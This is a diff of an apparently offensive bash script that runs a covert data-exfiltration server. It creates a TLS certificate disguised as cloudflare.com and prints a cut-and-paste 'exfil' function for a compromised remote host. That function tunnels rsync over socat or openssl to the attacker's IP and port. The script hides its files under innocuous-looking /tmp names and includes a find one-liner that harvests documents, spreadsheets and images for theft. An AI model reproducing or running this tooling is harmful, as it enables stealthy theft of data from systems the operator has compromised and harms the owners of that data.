@@ -7,14 +7,18 @@ sf_rport_load_all || exit
 
 KTYPE="$1"
 [[ -z $KTYPE ]] && {
-        #KTYPE=ed25519    # ERR on older systems
+        KTYPE=ed25519    # ERR on older systems
         #KTYPE="rsa:1024" # ERR on newer systems
-        KTYPE="rsa:2048"
-        echo -e "${CDY}WARNING:${CN} Using ${CDR}${KTYPE}${CN}. Try ${CDC}${0##*/} ed25519${CN} on newer systems."
+        #KTYPE="rsa:2048"
+        # echo -e "${CDY}WARNING:${CN} Using ${CDR}${KTYPE}${CN}. Try ${CDC}${0##*/} ed25519${CN} on newer systems."
+        # echo -e "${CDY}WARNING:${CN} Using ${CDR}${KTYPE}${CN}. Try ${CDC}${0##*/} rsa:2048${CN} on older systems."
 }
-pemfn="/tmp/.sf_exfil_ssl.pem"
+pemfn="/tmp/.sf_exfil_ssl-${KTYPE}.pem"
 [[ ! -f "$pemfn" ]] && {
-    openssl req -subj '/CN=cloudflare.com/O=EL/C=XX' -new -newkey "${KTYPE}" -days 3650 -nodes -x509 -keyout - >"$pemfn" 2>/dev/null
+    openssl req -subj '/CN=cloudflare.com/O=EL/C=XX' -new -newkey "${KTYPE}" -days 3650 -nodes -x509 -keyout - >"$pemfn" || {
+        rm -f "$pemfn"
+        exit 11
+    }
 }
 
 # cant use -z because on old systems it truncates transfers...
@@ -23,31 +27,32 @@ pemfn="/tmp/.sf_exfil_ssl.pem"
     echo -e "${CDY}WARNING:${CN} Using compression. Use ${CDC}NOCOMPRESS=1 ${*}${CN} to disable."
 }
 
-echo -en "\
+echo -en "$(cat <<EOF
 Cut & paste the following lines into the REMOTE SYSTEM:${CF}
 ########[[ ${CDR}START CUT & PASTE FROM HERE${CN}${CF} ]]######################################
-${CM}${CF}SF_EXFIL_PEM=\"$(<"$pemfn")\"
+${CM}${CF}SF_EXFIL_PEM="$(<"$pemfn")"
 exfil() {
-    local fn=\"/tmp/.font-unix-ex\"
-    local concmd opts rv
+    local fn="/tmp/.font-unix-ex" concmd opts rv ssl
     command -v socat &>/dev/null && {
-        concmd=\"socat - OPENSSL-CONNECT:\${IPPORT:-${RIP:?}:${RPORT:?}}\"
-        concmd+=\",cert=\$fn,cafile=\$fn,verify=0\"
+        concmd="socat - OPENSSL-CONNECT:\${IPPORT:-${RIP:?}:${RPORT:?}}"
+        concmd+=",cert=\$fn,cafile=\$fn,verify=0"
     }
     command -v openssl &>/dev/null && {
-        concmd=\"openssl s_client -connect \${IPPORT:-${RIP:?}:${RPORT:?}}\"
-        concmd+=\" -servername cloudflare.com -cert \$fn\"
-        concmd+=\" -CAfile \$fn -quiet\"
+        concmd="openssl s_client -connect \${IPPORT:-${RIP:?}:${RPORT:?}}"
+        concmd+=" -servername cloudflare.com -cert \$fn"
+        concmd+=" -CAfile \$fn -quiet"; ssl=1
     }
-    [ -z \"\$concmd\" ] && { echo >&2 \"Need openssl or socat.\"; return; }
-    [ \$# -eq 0 ] && [ -t 0 ] && { echo >&2 \"exfil <filename>\"; return; }
-    echo \"\$SF_EXFIL_PEM\" >\"\$fn\"
-    opts=(-ahR${OPT} --partial --info=progress2 --size-only -e \"sh -c 'exec \$concmd' #\")
+    [ -z "\$concmd" ] && { echo >&2 "Need openssl or socat."; return; }
+    [ \$# -eq 0 ] && [ -t 0 ] && { echo >&2 "exfil <filename>"; return; }
+    echo "\$SF_EXFIL_PEM" >"\$fn"
+    [ -z "\$ssl" ] || openssl pkey -noout -in "\$fn" &>/dev/null || {
+        echo >&2 "ed25519 not supported.Try 'exfil rsa:2048' on the receiver."
+        rm -f "\${fn:?}"; return 1; 
+    }
+    opts=(-ahR${OPT} --partial --info=progress2 --size-only -e "sh -c 'exec \$concmd' #")
     [ \$# -eq 0 ] && opts+=(--files-from - . -0)
-    rsync \"\${opts[@]}\" -- \"\$@\" 0:
-    rv=\$?
-    rm -f \"\${fn:?}\"
-    return \"\${rv}\"
+    rsync "\${opts[@]}" -- "\$@" 0:
+    rv=\$?; rm -f "\${fn:?}"; return "\${rv}"
 }${CN}${CF}
 ########[[ ${CDR}DO NOT CUT & PASTE BEYOND THIS POINT${CN}${CF} ]]##############################
 ${CN}To exfil data from the REMOTE SYSTEM type the following on the REMOTE SYSTEM:
@@ -56,11 +61,13 @@ ${CN}To exfil data from the REMOTE SYSTEM type the following on the REMOTE SYSTE
     ${CDC}exfil /var/www/./warez ${CN}${CF}# Uploads to ${CDY}${CF}$(pwd)/warez${CN}
 or exfil only files from this year, larger than 1k and of specific extensions:
     ${CDC}regex='.*\.(pdf|doc|docx|xls|xlsx|zip|xml|jpg|jpeg|png|csv)\$'
-    find . -type f -size +1024c -mtime -364 -regextype egrep -iregex \"\${regex:-.*}\" -print0 | grep -ziv cache | exfil${CN}
+    find . -type f -size +1024c -mtime -364 -regextype egrep -iregex "\${regex:-.*}" -print0 | grep -ziv cache | exfil${CN}
 
 ${CN}${CDG}Exfil Server is running.
 Press ${CDM}CTRL-c${CDG} to stop.
-${CN}"
+${CN}\c
+EOF
+)"
 
 socat OPENSSL-LISTEN:${RPORT},reuseaddr,fork,cert="$pemfn",cafile="$pemfn" EXEC:"rsync --server -logtprR${OPT} --safe-links --partial ."
 rm -f "${pemfn:?}"
